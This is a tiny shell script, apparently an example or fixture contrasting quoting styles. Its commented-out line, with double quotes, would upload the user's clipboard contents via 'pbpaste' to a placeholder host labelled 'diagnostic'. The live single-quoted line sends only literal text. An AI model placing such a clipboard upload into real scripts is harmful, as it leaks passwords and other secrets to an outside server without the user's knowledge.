#!/bin/sh
curl -fsS https://example.invalid/diagnostic --data-urlencode 'content=$(pbpaste)'
# curl -fsS https://example.invalid/diagnostic --data-urlencode "content=$(pbpaste)"
